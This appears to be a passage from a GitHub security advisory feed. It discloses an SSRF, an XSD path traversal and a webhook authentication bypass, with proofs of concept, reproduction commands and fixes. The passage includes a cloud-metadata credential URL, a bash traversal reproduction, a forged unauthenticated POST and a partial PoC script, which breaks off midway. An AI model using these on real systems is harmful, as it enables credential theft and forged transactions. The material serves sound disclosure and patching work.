<p><code>datamodel-code-generator</code>'s built-in HTTP fetcher (<code>http.get_body</code>) issues an <code>httpx.GET</code> against any URL passed to <code>--url</code> (or reached via a redirect chain) with <strong>no allow-list, no deny-list, no IP/host validation, and <code>follow_redirects=True</code></strong>. Loopback addresses, RFC1918 ranges, link-local (<code>169.254.169.254</code> cloud metadata), unique-local IPv6 and any other network-accessible target are all reachable. The JSON/YAML response body is parsed as a schema and reflected into the generated <code>.py</code> source, exfiltrating the response to anyone with access to that file (commonly committed to a repository).</p>
<h3 id="details">Details</h3>
<p>Sink: <code>src/datamodel_code_generator/http.py</code>, <code>get_body</code> (lines 31–61, at tag <code>0.60.1</code> / commit <code>a321547e</code>):</p>
<pre><code class="language-python">def get_body(url, headers=None, ignore_tls=False,
             query_parameters=None, timeout=DEFAULT_HTTP_TIMEOUT) -&gt; str:
    httpx = _get_httpx()
    try:
        response = httpx.get(
            url,
            headers=headers,
            verify=not ignore_tls,
            follow_redirects=True,          # (A)
            params=query_parameters,
            timeout=timeout,
        )
    except Exception as e:
        ...
    if response.status_code &gt;= 400:
        ...
    content_type = response.headers.get("content-type", "").lower()
    if "text/html" in content_type:
        raise SchemaFetchError(...)         # (B) — only filter
    return response.text                    # (C) → embedded in generated.py
</code></pre>
<ul>
<li>(A) follows redirects unconditionally — a public URL → 302 → internal address chain works.</li>
<li>(B) the only filter is rejecting <code>text/html</code>. Non-HTML internal endpoints (JSON APIs, cloud metadata, admin services) pass through.</li>
<li>(C) the response body becomes the schema; its <code>title</code>, <code>description</code>, <code>properties</code>, etc. land in the generated <code>.py</code> as class attributes and <code>Field(description=...)</code> strings.</li>
</ul>
<p><code>get_body</code> is called by <code>parser/base.py:1326</code> (<code>_get_text_from_url</code>), which is reached from CLI argument <code>--url &lt;URL&gt;</code>. (The <code>$ref</code> path is a separate advisory — see GHSA-D.)</p>
<p>Only affects users who installed the <code>[http]</code> extra (<code>pip install 'datamodel-code-generator[http]'</code>).</p>
<h3 id="poc">PoC</h3>
<p>A self-contained one-file PoC available here:
<a href="https://gist.github.com/thegr1ffyn/18de777d6c800a3b47715425e3f3e8f5">https://gist.github.com/thegr1ffyn/18de777d6c800a3b47715425e3f3e8f5</a></p>
<h3 id="impact">Impact</h3>
<p><strong>Who is impacted.</strong> Anyone who runs <code>datamodel-codegen</code> with a <code>--url</code> they didn't fully verify, or who runs it inside a network with reachable internal services. Realistic scenarios:</p>
<ol>
<li><strong>Trojan documentation / README.</strong> A blog post or README example reads <code>datamodel-codegen --url https://schemas.example.com/user.json -o user.py</code>. The attacker controls <code>example.com</code>, redirects to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;</code>, and the IAM credentials end up as a docstring in <code>user.py</code>.</li>
<li><strong>Internal port scan / disclosure.</strong> Iterating <code>--url http://127.0.0.1:&lt;port&gt;/health</code> probes localhost services; non-HTML, non-error responses confirm a service and leak its body into the generated file.</li>
<li><strong>CI poisoning.</strong> A PR adds a Makefile rule that calls <code>datamodel-codegen --url $(SCHEMA_URL)</code>; the CI runner reaches every internal service in its VPC and the response lands in PR artifacts.</li>
</ol>
<p><strong>Suggested fix.</strong> Resolve the URL host, reject loopback / private / link-local / multicast / reserved IPs by default, disable redirects by default (<code>follow_redirects=False</code>), re-validate after each redirect if the user opts into following them, and add an <code>--allow-private-network</code> flag for opt-in legitimate use.</p>
<h3 id="maintainer-resolution">Maintainer resolution</h3>
<p>This report was fixed together with GHSA-954p-556p-r752 by the private security PR koxudaxi/datamodel-code-generator-ghsa-rfr2-mq9m-x2qx#1, merged into the public repository as 5fdba4a09f2d7a9996a504975b7ef7d63e3715bb. Follow-up generated-file and coverage fixes were merged in koxudaxi/datamodel-code-generator#3279 and docs were synced in #3280. The patched release is 0.61.0.</p>
<p>The patch hardens the shared HTTP fetcher used by both direct CLI <code>--url</code> fetching and remote JSON Schema/OpenAPI <code>$ref</code> resolution:</p>
<ul>
<li>validates HTTP(S) URLs before fetching;</li>
<li>blocks localhost, loopback, private, link-local, reserved, and other non-public network targets by default;</li>
<li>disables automatic redirect following and validates each redirect target before requesting it;</li>
<li>adds <code>--allow-private-network</code> / <code>allow_private_network=True</code> as an explicit opt-in for trusted internal schema endpoints.</li>
</ul>
<p>Remote <code>$ref</code> fetching remains controlled by <code>--allow-remote-refs</code>; non-public/internal targets additionally require <code>--allow-private-network</code>.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-rfr2-mq9m-x2qx">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-rfr2-mq9m-x2qx</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/5fdba4a09f2d7a9996a504975b7ef7d63e3715bb">https://github.com/koxudaxi/datamodel-code-generator/commit/5fdba4a09f2d7a9996a504975b7ef7d63e3715bb</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.61.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.61.0</a></li>
<li><a href="https://github.com/advisories/GHSA-rfr2-mq9m-x2qx">https://github.com/advisories/GHSA-rfr2-mq9m-x2qx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rfr2-mq9m-x2qx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:30:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[datamodel-code-generator] datamodel-code-generator vulnerable to arbitrary local file read via XSD `schemaLocation` (`xs:include`/`xs:import`) path traversal, with no remote-ref gate]]></title>
        <id>https://github.com/advisories/GHSA-442q-2j6p-642g</id>
        <link href="https://github.com/advisories/GHSA-442q-2j6p-642g"/>
        <updated>2026-07-28T21:26:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When generating models from an XML Schema (<code>--input-file-type xmlschema</code>), <code>datamodel-code-generator</code> resolves <code>&lt;xs:include&gt;</code>, <code>&lt;xs:import&gt;</code>, <code>&lt;xs:redefine&gt;</code>, and <code>&lt;xs:override&gt;</code> <code>schemaLocation</code> attributes against the source directory and reads the target with no restriction to the input/base directory. An attacker who controls the input XSD can read arbitrary files via <code>../</code> traversal or an absolute path, and the included schema's contents (type names, restrictions, enumerations) are folded into the generated output. Unlike the JSON-Schema <code>$ref</code> path, there is no <code>allow_remote_refs</code> control for XSD, so <code>--no-allow-remote-refs</code> does not mitigate it. This is an unauthenticated path-traversal / information-disclosure issue reachable in the default configuration.</p>
<h3 id="details">Details</h3>
<p>The XSD parser walks include-style children and reads each <code>schemaLocation</code> with only an <code>is_file()</code> check (<code>src/datamodel_code_generator/parser/xmlschema.py</code>):</p>
<pre><code class="language-python">location = (source_dir / schema_location).resolve()   # .resolve() collapses ../, escapes base
if location in seen or not location.is_file():
    continue
included_root = self._parse_schema(_read_xml_text(location, self.encoding), location)
</code></pre>
<p><code>schema_location</code> is attacker-controlled and <code>_read_xml_text</code> does <code>path.read_bytes()</code>. Because <code>(source_dir / schema_location).resolve()</code> normalizes <code>..</code> and accepts absolute paths, the resolved target can be any file the process can read; there is no <code>is_relative_to(base_path)</code> containment (contrast the JSON-Schema HTTP-local branch, which does enforce it). The same unbounded read occurs both during version detection and during the main include-processing pass, so the included content is incorporated into the generated module.</p>
<p>Related vectors that were tested and do NOT apply (stdlib <code>xml.etree.ElementTree</code> is used): external-entity XXE file read does not occur (ElementTree does not fetch external entities), and entity-expansion "billion laughs" is rejected by CPython's expat amplification limit.</p>
<h3 id="poc">PoC</h3>
<p>Self-contained reproducer (creates a temp dir, runs the generator, cleans up): <a href="https://gist.github.com/thegr1ffyn/c7096b797926348875d888652867eeb4">https://gist.github.com/thegr1ffyn/c7096b797926348875d888652867eeb4</a>  (<code>poc.py</code>).</p>
<p>Minimal manual reproduction:</p>
<pre><code class="language-bash">mkdir -p /tmp/x/secret /tmp/x/proj
cat &gt; /tmp/x/secret/leak.xsd &lt;&lt;'EOF'
&lt;?xml version="1.0"?&gt;
&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
  &lt;xs:simpleType name="LEAK_5150"&gt;&lt;xs:restriction base="xs:string"/&gt;&lt;/xs:simpleType&gt;
&lt;/xs:schema&gt;
EOF
cat &gt; /tmp/x/proj/attack.xsd &lt;&lt;'EOF'
&lt;?xml version="1.0"?&gt;
&lt;xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"&gt;
  &lt;xs:include schemaLocation="../../x/secret/leak.xsd"/&gt;
  &lt;xs:element name="Root" type="LEAK_5150"/&gt;
&lt;/xs:schema&gt;
EOF
datamodel-codegen --input /tmp/x/proj/attack.xsd --input-file-type xmlschema --no-allow-remote-refs --output /tmp/x/out.py
grep LEAK_5150 /tmp/x/out.py   # content from outside the project dir appears in generated code
</code></pre>
<p>An absolute <code>schemaLocation="/abs/path/leak.xsd"</code> works identically.</p>
<h3 id="impact">Impact</h3>
<p>Arbitrary local file read / path traversal (CWE-22) leading to information disclosure (CWE-200). Any application, CI pipeline, or multi-tenant service that generates models from an attacker-supplied XSD and exposes (returns, logs, commits, renders) the generated code is affected. The attacker can read files outside the input tree whose data is addressable as XSD content (other schemas, configs), and the read itself is an arbitrary-file-access primitive. No flag mitigates it. The attacker controls only the input schema; no authentication or special privileges are required. (Raw bytes of files that are not valid XML are read into the process but not echoed verbatim, since parsing fails; verbatim disclosure applies to XML/XSD-shaped data.)</p>
<h3 id="suggested-remediation">Suggested remediation</h3>
<p>Reject resolved <code>schemaLocation</code> targets that are not <code>resolved.is_relative_to(self.base_path)</code>, and bring XSD includes under the same remote/external-reference policy enforced for JSON-Schema <code>$ref</code>.</p>
<h3 id="maintainer-status">Maintainer status</h3>
<p>Confirmed by maintainer review and regression tests. The private fix PR was merged and released in <code>0.62.0</code>: <a href="https://github.com/koxudaxi/datamodel-code-generator-ghsa-442q-2j6p-642g/pull/1">https://github.com/koxudaxi/datamodel-code-generator-ghsa-442q-2j6p-642g/pull/1</a></p>
<p>Fix summary: reject XSD <code>schemaLocation</code> targets that resolve outside the input base path, including relative traversal and absolute paths.</p>
<p>Release status: fixed in <code>0.62.0</code>. XML Schema input support was introduced in <code>0.59.0</code>, so affected versions are <code>&gt;= 0.59.0, &lt;= 0.61.0</code>.</p>
<p>Validation: <code>uv run --group test --extra http pytest tests/main/xmlschema/test_main_xmlschema.py</code> passed locally; <code>uv run --group fix ruff check src/datamodel_code_generator/parser/xmlschema.py tests/main/xmlschema/test_main_xmlschema.py</code> passed.</p>
<p>Submitted by: Hamza Haroon (thegr1ffyn)</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-442q-2j6p-642g">https://github.com/koxudaxi/datamodel-code-generator/security/advisories/GHSA-442q-2j6p-642g</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/commit/d2d5cecd9fd3a2a6dbf148bf0740b83a11fc6820">https://github.com/koxudaxi/datamodel-code-generator/commit/d2d5cecd9fd3a2a6dbf148bf0740b83a11fc6820</a></li>
<li><a href="https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.62.0">https://github.com/koxudaxi/datamodel-code-generator/releases/tag/0.62.0</a></li>
<li><a href="https://github.com/advisories/GHSA-442q-2j6p-642g">https://github.com/advisories/GHSA-442q-2j6p-642g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-442q-2j6p-642g</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T21:26:41.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[deepsearcher] zilliztech deep-searcher has an Incorrect Privilege Assignment issue]]></title>
        <id>https://github.com/advisories/GHSA-43px-gpwc-q84v</id>
        <link href="https://github.com/advisories/GHSA-43px-gpwc-q84v"/>
        <updated>2026-07-28T20:54:23.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in zilliztech deep-searcher up to 0.0.2. This affects the function CollectionRouter.invoke of the file deepsearcher/agent/collection_router.py. This manipulation of the argument kwargs causes improper access controls. Remote exploitation of the attack is possible. The exploit has been made available to the public and could be used for attacks. The pull request to fix this issue awaits acceptance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-11466">https://nvd.nist.gov/vuln/detail/CVE-2026-11466</a></li>
<li><a href="https://github.com/zilliztech/deep-searcher/issues/267">https://github.com/zilliztech/deep-searcher/issues/267</a></li>
<li><a href="https://github.com/zilliztech/deep-searcher/pull/268">https://github.com/zilliztech/deep-searcher/pull/268</a></li>
<li><a href="https://github.com/zilliztech/deep-searcher">https://github.com/zilliztech/deep-searcher</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-11466">https://vuldb.com/cve/CVE-2026-11466</a></li>
<li><a href="https://vuldb.com/submit/833652">https://vuldb.com/submit/833652</a></li>
<li><a href="https://vuldb.com/vuln/369086">https://vuldb.com/vuln/369086</a></li>
<li><a href="https://vuldb.com/vuln/369086/cti">https://vuldb.com/vuln/369086/cti</a></li>
<li><a href="https://github.com/advisories/GHSA-43px-gpwc-q84v">https://github.com/advisories/GHSA-43px-gpwc-q84v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-43px-gpwc-q84v</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-08T00:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hermes-agent] hermes-agent has an Injection issue]]></title>
        <id>https://github.com/advisories/GHSA-33qv-c5qm-799v</id>
        <link href="https://github.com/advisories/GHSA-33qv-c5qm-799v"/>
        <updated>2026-07-28T19:57:21.000Z</updated>
        <content type="html"><![CDATA[<p>A weakness has been identified in NousResearch hermes-agent up to 2026.4.30. This affects the function _scan_memory_content of the file tools/memory_tool.py. This manipulation causes injection. The attack can be initiated remotely. The exploit has been made available to the public and could be used for attacks. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10223">https://nvd.nist.gov/vuln/detail/CVE-2026-10223</a></li>
<li><a href="https://gist.github.com/YLChen-007/a1fb77ad2488c545a35d0f66356ea7b4">https://gist.github.com/YLChen-007/a1fb77ad2488c545a35d0f66356ea7b4</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10223">https://vuldb.com/cve/CVE-2026-10223</a></li>
<li><a href="https://vuldb.com/submit/822021">https://vuldb.com/submit/822021</a></li>
<li><a href="https://vuldb.com/vuln/367502">https://vuldb.com/vuln/367502</a></li>
<li><a href="https://vuldb.com/vuln/367502/cti">https://vuldb.com/vuln/367502/cti</a></li>
<li><a href="https://github.com/NousResearch/hermes-agent/commit/0dee92df22bdc0cfbcad90ca954aa14916f018de">https://github.com/NousResearch/hermes-agent/commit/0dee92df22bdc0cfbcad90ca954aa14916f018de</a></li>
<li><a href="https://github.com/advisories/GHSA-33qv-c5qm-799v">https://github.com/advisories/GHSA-33qv-c5qm-799v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-33qv-c5qm-799v</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-01T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hermes-agent] hermes-agent has an Uncontrolled Resource Consumption issue]]></title>
        <id>https://github.com/advisories/GHSA-pmqc-57g8-c22c</id>
        <link href="https://github.com/advisories/GHSA-pmqc-57g8-c22c"/>
        <updated>2026-07-28T19:46:03.000Z</updated>
        <content type="html"><![CDATA[<p>A security vulnerability has been detected in NousResearch hermes-agent up to 2026.4.30. This vulnerability affects the function _handle_webhook_request of the file gateway/platforms/feishu.py of the component Webhook Endpoint. Such manipulation leads to resource consumption. The attack can be launched remotely. The exploit has been disclosed publicly and may be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10224">https://nvd.nist.gov/vuln/detail/CVE-2026-10224</a></li>
<li><a href="https://gist.github.com/YLChen-007/0304e313d811f187ade93d3b01de0f87">https://gist.github.com/YLChen-007/0304e313d811f187ade93d3b01de0f87</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10224">https://vuldb.com/cve/CVE-2026-10224</a></li>
<li><a href="https://vuldb.com/submit/822022">https://vuldb.com/submit/822022</a></li>
<li><a href="https://vuldb.com/vuln/367503">https://vuldb.com/vuln/367503</a></li>
<li><a href="https://vuldb.com/vuln/367503/cti">https://vuldb.com/vuln/367503/cti</a></li>
<li><a href="https://github.com/NousResearch/hermes-agent/issues/29154">https://github.com/NousResearch/hermes-agent/issues/29154</a></li>
<li><a href="https://github.com/NousResearch/hermes-agent/pull/73406">https://github.com/NousResearch/hermes-agent/pull/73406</a></li>
<li><a href="https://github.com/advisories/GHSA-pmqc-57g8-c22c">https://github.com/advisories/GHSA-pmqc-57g8-c22c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pmqc-57g8-c22c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-01T06:30:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[hermes-agent] hermes-agent has an Injection issue]]></title>
        <id>https://github.com/advisories/GHSA-xq8w-9jvx-gm3v</id>
        <link href="https://github.com/advisories/GHSA-xq8w-9jvx-gm3v"/>
        <updated>2026-07-28T17:27:54.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was identified in NousResearch hermes-agent up to 0.12.0. Affected by this vulnerability is the function _compress_context of the file run_agent.py. The manipulation leads to injection. It is possible to initiate the attack remotely. The exploit is publicly available and might be used. The vendor was contacted early about this disclosure but did not respond in any way.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-10221">https://nvd.nist.gov/vuln/detail/CVE-2026-10221</a></li>
<li><a href="https://gist.github.com/YLChen-007/d343fcfe2c009cd45f56dc475fd5ac03">https://gist.github.com/YLChen-007/d343fcfe2c009cd45f56dc475fd5ac03</a></li>
<li><a href="https://vuldb.com/cve/CVE-2026-10221">https://vuldb.com/cve/CVE-2026-10221</a></li>
<li><a href="https://vuldb.com/submit/822019">https://vuldb.com/submit/822019</a></li>
<li><a href="https://vuldb.com/vuln/367500">https://vuldb.com/vuln/367500</a></li>
<li><a href="https://vuldb.com/vuln/367500/cti">https://vuldb.com/vuln/367500/cti</a></li>
<li><a href="https://github.com/NousResearch/hermes-agent/issues/26979">https://github.com/NousResearch/hermes-agent/issues/26979</a></li>
<li><a href="https://github.com/NousResearch/hermes-agent/pull/69860">https://github.com/NousResearch/hermes-agent/pull/69860</a></li>
<li><a href="https://github.com/NousResearch/hermes-agent/commit/2ca38e5df43411afe11aedfc34bfd71a2eecd4bb">https://github.com/NousResearch/hermes-agent/commit/2ca38e5df43411afe11aedfc34bfd71a2eecd4bb</a></li>
<li><a href="https://github.com/advisories/GHSA-xq8w-9jvx-gm3v">https://github.com/advisories/GHSA-xq8w-9jvx-gm3v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xq8w-9jvx-gm3v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-01T06:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pytonapi] pytonapi has a Webhook Custom Path Authentication Bypass]]></title>
        <id>https://github.com/advisories/GHSA-3fcr-jvgp-7f58</id>
        <link href="https://github.com/advisories/GHSA-3fcr-jvgp-7f58"/>
        <updated>2026-07-28T17:09:03.000Z</updated>
        <content type="html"><![CDATA[<h2 id="webhook-custom-path-authentication-bypass-in-pytonapi">Webhook Custom Path Authentication Bypass in pytonapi</h2>
<h3 id="summary">Summary</h3>
<p><code>TonapiWebhookDispatcher</code> in pytonapi 2.2.0 fails to validate the <code>Authorization</code> header when a webhook handler is registered with the documented <code>path=</code> argument. During <code>setup()</code>, bearer tokens are stored only under the default suffix paths (e.g., <code>/hook/account-tx</code>), but the custom path (e.g., <code>/hook/custom</code>) is never added to the token map. When an incoming request arrives at the custom path, <code>self._tokens.get(path)</code> returns <code>None</code>, causing the <code>if expected_token is not None</code> guard to evaluate to <code>False</code> and silently skip authentication entirely. An unauthenticated remote attacker can POST arbitrary forged payloads to the custom webhook endpoint and trigger victim-defined handlers with full integrity impact.</p>
<h3 id="details">Details</h3>
<p>The vulnerability is a fail-open authentication check in <code>pytonapi/webhook/dispatcher.py</code>.</p>
<p><strong>Token registration (setup)</strong> stores tokens only under default suffix paths:</p>
<pre><code class="language-python"># dispatcher.py lines 109-112
suffix = self.DEFAULT_SUFFIXES[event_type]
local_path = self._path + suffix          # e.g., "/hook/account-tx"
webhook = await self._client.ensure(f"{self._url}{suffix}")
self._tokens[local_path] = webhook.token  # custom path is NEVER stored here
</code></pre>
<p><strong>Handler registration</strong> preserves the custom path in the handler tuple:</p>
<pre><code class="language-python"># dispatcher.py lines 339, 342
resolved_path = path or self._resolve_path(event_type)  # -&gt; "/hook/custom"
self._handlers[event_type].append((account_filter, fn, resolved_path))
</code></pre>
<p><strong>Path routing</strong> (<code>_build_path_map</code>) correctly maps the custom path to the event type:</p>
<pre><code class="language-python"># dispatcher.py line 182
return {handlers[0][2]: et for et, handlers in self._handlers.items() if handlers}
# -&gt; {"/hook/custom": WebhookEventType.ACCOUNT_TX}
</code></pre>
<p><strong>Authentication check</strong> (fail-open):</p>
<pre><code class="language-python"># dispatcher.py lines 286-288
expected_token = self._tokens.get(path)        # "/hook/custom" -&gt; None
if expected_token is not None and authorization != f"Bearer {expected_token}":
    raise TONAPIError("Invalid webhook token")  # SKIPPED because expected_token is None
</code></pre>
<p>Because <code>expected_token</code> is <code>None</code> for any custom path, the condition <code>expected_token is not None</code> is always <code>False</code>. The <code>raise</code> is never reached regardless of what the <code>Authorization</code> header contains — or whether it is absent entirely. Execution continues to lines 291 and 297 where the attacker's payload is parsed and the victim handler is invoked.</p>
<p>The <code>path=</code> argument is an officially documented feature (see <code>docs/webhooks/guide.mdx</code> lines 140 and 153), meaning any user following the public documentation is vulnerable.</p>
<h3 id="poc">PoC</h3>
<p><strong>Requirements:</strong> Python 3.12, pytonapi 2.2.0 installed from source (commit <code>e46c4a4</code>).</p>
<p><strong>Build and run with Docker:</strong></p>
<pre><code class="language-bash"># From the repository root
docker build -t vuln001-pytonapi -f vuln-001/Dockerfile .
docker run --rm vuln001-pytonapi
</code></pre>
<p>The Dockerfile installs pytonapi from the local source tree and executes <code>poc.py</code>.</p>
<p><strong>What the PoC does:</strong></p>
<ol>
<li>Creates a <code>TonapiWebhookDispatcher</code> with a custom-path handler (<code>path="/hook/custom"</code>).</li>
<li>Calls <code>setup()</code> — tokens are registered only for <code>/hook/account-tx</code>.</li>
<li><strong>Case A</strong> — calls <code>process("/hook/custom", forged_payload, authorization=None)</code>: no <code>Authorization</code> header, handler fires.</li>
<li><strong>Case B</strong> — calls <code>process("/hook/custom", forged_payload, authorization="Bearer totally-wrong-token")</code>: wrong token, handler still fires.</li>
<li><strong>Case C</strong> (control) — same attack against the default path <code>/hook/account-tx</code> with no auth: correctly raises <code>TONAPIError</code>.</li>
<li><strong>Case D</strong> (control) — default path with valid token: correctly accepted.</li>
</ol>
<p><strong>Simulated malicious HTTP request routed to the victim dispatcher:</strong></p>
<pre><code>POST /hook/custom HTTP/1.1
Host: victim.example
Content-Type: application/json
# No Authorization header

{"event_type":"account_tx","account_id":"0:victim","lt":1,"tx_hash":"FORGED_TX_HASH"}
</code></pre>
<p><strong>Expected output confirming the vulnerability:</strong></p>
<pre><code>[dispatcher_a] _tokens map: {'/hook/account-tx': 'real-secret-token-abc123'}

Case A: VULNERABLE — handler invoked with NO Authorization header; custom_called=['FORGED_TX_HASH']
Case B: VULNERABLE — handler invoked with WRONG Authorization header; custom_called=['FORGED_TX_HASH']
Case C: CORRECTLY_REJECTED — Invalid webhook token
Case D: CORRECTLY_ACCEPTED — default path with valid auth

[RESULT] VULNERABILITY CONFIRMED
</code></pre>
<p><strong>Remediation (patch):</strong></p>
<pre><code class="language-diff">--- a/pytonapi/webhook/dispatcher.py
+++ b/pytonapi/webhook/dispatcher.py
@@
     def _build_path_map(self) -&gt; dict[str, WebhookEventType]:
-        return {handlers[0][2]: et for et, handlers in self._handlers.items() if handlers}
+        return {path: et for et, handlers in self._handlers.items() for _, _, path in handlers}
@@
-            suffix = self.DEFAULT_SUFFIXES[event_type]
-            local_path = self._path + suffix
-            webhook = await self._client.ensure(f"{self._url}{suffix}")
-            self._tokens[local_path] = webhook.token
+            local_paths = sorted({path for _, _, path in handlers})
+            for local_path in local_paths:
+                endpoint = self._endpoint_for_path(local_path)
+                webhook = await self._client.ensure(endpoint)
+                self._tokens[local_path] = webhook.token
@@
+    def _endpoint_for_path(self, path: str) -&gt; str:
+        parsed = urlparse(self._url)
+        return parsed._replace(path=path, params="", query="", fragment="").geturl()
</code></pre>
<h3 id="impact">Impact</h3>
<p>This is an <strong>Improper Authentication</strong> vulnerability (CWE-287). Any application that:</p>
<ol>
<li>Uses <code>TonapiWebhookDispatcher</code> from pytonapi 2.2.0, <strong>and</strong></li>
<li>Registers at least one handler using the documented <code>path=</code> keyword argument,</li>
</ol>
<p>is fully exposed. The webhook endpoint becomes publicly callable without credentials. An unauthenticated network attacker can:</p>
<ul>
<li>Forge arbitrary TON blockchain events (e.g., fake <code>account_tx</code> notifications).</li>
<li>Trigger victim-defined business logic — payment processing, account state updates, notification dispatch — with attacker-controlled data.</li>
<li>Cause financial or operational harm depending on what the victim handler does.</li>
</ul>
<p>Confidentiality is not directly affected (the attacker sends data, does not read it). Availability is not the primary impact. Integrity is critically impacted because the attacker fully controls the event data delivered to the handler.</p>
<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
<h4 id="dockerfile"><code>Dockerfile</code></h4>
<pre><code class="language-dockerfile">FROM python:3.12-slim

WORKDIR /app

# Copy the repository source code
COPY repo/ /app/repo/

# Install pytonapi from local source (exact commit under test)
RUN pip install --no-cache-dir /app/repo/

# Copy the proof-of-concept script
COPY vuln-001/poc.py /app/poc.py

# Run the PoC by default
CMD ["python3", "/app/poc.py"]
</code></pre>
<h4 id="pocpy"><code>poc.py</code></h4>
<pre><code class="language-python">"""
PoC for VULN-001: Webhook custom path authentication bypass
===========================================================
CVE candidate: CWE-287 — Improper Authentication
Affected:      pytonapi 2.2.0 (commit e46c4a4)
File:          pytonapi/webhook/dispatcher.py

Root cause
----------
When a handler is registered with the documented `path=` argument:

    @dispatcher.account_tx(path="/hook/custom")
    async def on_tx(event): ...

setup() stores the bearer token ONLY for the default-suffix path:

    local_path = self._path + suffix       # -&gt; "/hook/account-tx"
    self._tokens[local_path] = webhook.token   # line 112

The custom path "/hook/custom" is never added to _tokens.

_build_path_map() correctly routes "/hook/custom" -&gt; ACCOUNT_TX
because it reads handlers[0][2] which IS the custom path when the
custom-path handler is the only one registered.

In process():

    expected_token = self._tokens.get(path)   # line 286 -&gt; None (missing)
    if expected_token is not None and ...:    # line 287 -&gt; False (SKIP)
        raise TONAPIError("Invalid webhook token")

Because expected_token is None the auth check is bypassed entirely
(fail-open). An attacker can POST any forged payload to the custom
path without any Authorization header and trigger the victim handler.

Test matrix
-----------
Case A: custom path + no auth          -&gt; SHOULD raise  (BUG: passes)
Case B: custom path + wrong auth token -&gt; SHOULD raise  (BUG: passes)
Case C: default path + no auth         -&gt; SHOULD raise  (control: correctly raises)
Case D: default path + valid auth      -&gt; SHOULD pass   (control: correctly passes)
"""

import asyncio
import sys

from pytonapi.exceptions import TONAPIError
from pytonapi.webhook.dispatcher import TonapiWebhookDispatcher


# ---------------------------------------------------------------------------
# Minimal stubs — no real network I/O needed
# ---------------------------------------------------------------------------

class FakeWebhookEndpoint:
    """Simulates the TONAPI webhook object returned by client.ensure()."""

    def __init__(self, token: str) -&gt; None:
        self.token = token

    async def sync_accounts(self, accounts: list) -&gt; None:
        pass


class FakeWebhookClient:
    """Simulates TonapiWebhookClient: records which endpoints were registered."""

    def __init__(self) -&gt; None:
        self.registered_endpoints: list[str] = []

    async def create_session(self) -&gt; None:
        pass

    async def ensure(self, endpoint: str) -&gt; FakeWebhookEndpoint:
        self.registered_endpoints.append(endpoint)
        return FakeWebhookEndpoint(token="real-secret-token-abc123")

    async def close_session(self) -&gt; None:
        pass


# ---------------------------------------------------------------------------
# PoC
# ---------------------------------------------------------------------------

async def run_poc() -&gt; bool:
    """Execute all test cases and return True if the vulnerability is confirmed."""

    # -----------------------------------------------------------------
    # Dispatcher A: only a CUSTOM path handler (the vulnerable scenario)
    # -----------------------------------------------------------------
    client_a = FakeWebhookClient()
    dispatcher_a = TonapiWebhookDispatcher(
        "https://victim.example/hook",
        client=client_a,
        accounts=["0:victim"],
    )
    custom_called: list[str] = []

    # Victim uses the documented path= feature (see docs/webhooks/guide.mdx:140)
    @dispatcher_a.account_tx("0:victim", path="/hook/custom")
    async def on_custom_tx(event) -&gt; None:
        custom_called.append(event.tx_hash)

    await dispatcher_a.setup()

    # -----------------------------------------------------------------
    # Dispatcher B: only a DEFAULT path handler (control group)
    # -----------------------------------------------------------------
    client_b = FakeWebhookClient()
